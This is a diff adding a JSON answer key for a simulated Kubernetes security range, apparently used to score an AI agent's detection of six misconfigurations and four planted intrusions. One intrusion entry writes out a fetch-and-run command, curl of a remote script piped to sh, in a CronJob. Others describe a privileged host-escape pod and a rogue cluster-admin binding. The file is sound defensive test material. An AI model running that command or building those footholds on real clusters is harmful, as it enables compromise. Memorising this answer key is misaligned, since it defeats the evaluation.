@@ -1,0 +1,18 @@
+{
+  "target": "sim-k8s-01",
+  "seeded_by": "cyberthunder/adapters/kubernetes/simulated.py (simulated) and range/k8s/seed.sh (k3s on the range VM)",
+  "purpose": "Score detection rate (measure of success #1). Do not show to the model.",
+  "match": "a finding on the target whose rule_version equals 'rule' and whose k8s-object tag equals 'object'",
+  "items": [
+    {"id": "M1", "kind": "misconfig", "detector": "check.pod_security", "rule": "k8s:cis:5.2.2", "object": "apps/deployment/web-frontend/web", "what": "web-frontend container runs privileged", "citations": ["CIS-K8s-5.2.2", "CCI-000366"], "fix_ref": "k8s:fix:deployment-drop-privileged"},
+    {"id": "M2", "kind": "misconfig", "detector": "check.apiserver", "rule": "CNTR-K8-000360", "object": "kube-system/pod/kube-apiserver-k3s-01", "what": "kube-apiserver --anonymous-auth=true", "citations": ["CNTR-K8-000360", "V-242390", "CCI-000213"], "fix_ref": "k8s:runbook:cntr-k8-000360"},
+    {"id": "M3", "kind": "misconfig", "detector": "check.kubelet", "rule": "CNTR-K8-000330", "object": "kube-system/pod/kubelet-k3s-01", "what": "kubelet --read-only-port=10255", "citations": ["CNTR-K8-000330", "V-242387", "CCI-000213"], "fix_ref": "k8s:runbook:cntr-k8-000330"},
+    {"id": "M4", "kind": "misconfig", "detector": "check.service_accounts", "rule": "k8s:cis:5.1.5", "object": "apps/serviceaccount/default", "what": "apps default service account automounts its token", "citations": ["CIS-K8s-5.1.5", "CCI-000366"], "fix_ref": "k8s:fix:sa-disable-automount"},
+    {"id": "M5", "kind": "misconfig", "detector": "check.apiserver", "rule": "CNTR-K8-000610", "object": "kube-system/pod/kube-apiserver-k3s-01", "what": "kube-apiserver has no --audit-log-path", "citations": ["CNTR-K8-000610", "V-242402", "CCI-001464"], "fix_ref": "k8s:runbook:cntr-k8-000610"},
+    {"id": "M6", "kind": "misconfig", "detector": "check.pod_security", "rule": "CNTR-K8-001160", "object": "apps/deployment/payments-api/api", "what": "payments-api reads DB_PASSWORD from a secret through an environment variable", "citations": ["CNTR-K8-001160", "V-242415", "CCI-004062"], "fix_ref": "k8s:runbook:secret-env"},
+    {"id": "I1", "kind": "intrusion", "detector": "hunt.admin_bindings", "rule": "k8s:hunt:admin-to-default", "object": "-/clusterrolebinding/system-monitor-binding", "what": "ClusterRoleBinding system-monitor-binding grants cluster-admin to default/default", "citations": ["T1078.004"], "fix_ref": "k8s:fix:delete-binding"},
+    {"id": "I2", "kind": "intrusion", "detector": "hunt.cronjobs", "rule": "k8s:hunt:cronjob-download", "object": "apps/cronjob/cache-warmer", "what": "CronJob cache-warmer runs curl http://10.10.10.10:8443/k.sh | sh every 15 minutes", "citations": ["T1053.007"], "fix_ref": "k8s:fix:delete-cronjob"},
+    {"id": "I3", "kind": "intrusion", "detector": "hunt.escape", "rule": "k8s:hunt:host-escape", "object": "apps/pod/kube-proxy-helper", "what": "pod kube-proxy-helper (ghcr.io image, named like a system daemon) is privileged with the node / mounted and hostPID", "citations": ["T1611", "T1036.005", "T1525"], "fix_ref": "k8s:fix:delete-pod"},
+    {"id": "I4", "kind": "intrusion", "detector": "hunt.system_pods", "rule": "k8s:hunt:unexpected-system-pod", "object": "kube-system/pod/metrics-collector-7d9f4", "what": "unknown pod metrics-collector-7d9f4 in kube-system pulling from 198.51.100.23:5000", "citations": ["T1610", "T1525"], "fix_ref": "k8s:fix:delete-pod"}
+  ]
+}
